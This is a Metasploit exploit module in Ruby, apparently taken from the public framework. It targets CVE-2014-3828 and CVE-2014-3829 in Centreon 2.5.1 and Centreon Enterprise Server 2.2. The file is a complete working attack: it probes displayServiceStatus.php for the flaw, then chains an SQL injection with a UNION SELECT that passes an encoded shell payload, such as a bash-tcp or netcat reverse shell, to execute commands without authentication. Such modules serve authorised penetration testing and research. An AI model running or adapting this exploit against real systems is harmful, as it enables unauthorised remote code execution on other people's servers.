##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Centreon SQL and Command Injection',
      'Description'    => %q{
        This module exploits several vulnerabilities on Centreon 2.5.1 and prior and Centreon
        Enterprise Server 2.2 and prior. Due to a combination of SQL injection and command
        injection in the displayServiceStatus.php component, it is possible to execute arbitrary
        commands as long as there is a valid session registered in the centreon.session table.
        In order to have a valid session, all it takes is a successful login from anybody.
        The exploit itself does not require any authentication.

        This module has been tested successfully on Centreon Enterprise Server 2.2.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'MaZ', # Vulnerability Discovery and Analysis
          'juan vazquez' # Metasploit Module
        ],
      'References'     =>
        [
          ['CVE', '2014-3828'],
          ['CVE', '2014-3829'],
          ['US-CERT-VU', '298796'],
          ['URL', 'http://seclists.org/fulldisclosure/2014/Oct/78']
        ],
      'Arch'           => ARCH_CMD,
      'Platform'       => 'unix',
      'Payload'        =>
        {
          'Space'       => 1500, # having into account 8192 as max URI length
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd cmd_bash',
              'RequiredCmd' => 'generic python gawk bash-tcp netcat ruby openssl'
            }
        },
      'Targets'        =>
        [
          ['Centreon Enterprise Server 2.2', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Oct 15 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/centreon'])
      ], self.class)
  end

  def check
    random_id = rand_text_numeric(5 + rand(8))
    res = send_session_id(random_id)

    unless res && res.code == 200 && res.headers['Content-Type'] && res.headers['Content-Type'] == 'image/gif'
      return Exploit::CheckCode::Safe
    end

    injection = "#{random_id}' or 'a'='a"
    res = send_session_id(injection)

    if res && res.code == 200
      if res.body && res.body.to_s =~ /sh: graph: command not found/
        return Exploit::CheckCode::Vulnerable
      elsif res.headers['Content-Type'] && res.headers['Content-Type'] == 'image/gif'
        return Exploit::CheckCode::Detected
      end
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "#{peer} - The SQLi cannot be exploited")
    elsif check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - The SQLi cannot be exploited. Possibly because there's nothing in the centreon.session table. Perhaps try again later?")
    end

    print_status("#{peer} - Exploiting...")
    random_id = rand_text_numeric(5 + rand(8))
    random_char = rand_text_alphanumeric(1)
    session_injection = "#{random_id}' or '#{random_char}'='#{random_char}"
    template_injection = "' UNION ALL SELECT 1,2,3,4,5,CHAR(59,#{mysql_payload}59),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- /**"
    res = send_template_id(session_injection, template_injection)

    if res && res.body && res.body.to_s =~ /sh: --imgformat: command not found/
      vprint_status("Output: #{res.body}")
    end
  end

  def send_session_id(session_id)
    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.to_s, 'include', 'views', 'graphs', 'graphStatus', 'displayServiceStatus.php'),
      'vars_get' =>
        {
          'session_id' => session_id
        }
    )

    res
  end

  def send_template_id(session_id, template_id)
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.to_s, 'include', 'views', 'graphs', 'graphStatus', 'displayServiceStatus.php'),
      'vars_get' =>
        {
          'session_id' => session_id,
          'template_id' => template_id
        }
      }, 3)

    res
  end

  def mysql_payload
    p = ''
    payload.encoded.each_byte { |c| p << "#{c},"}
    p
  end

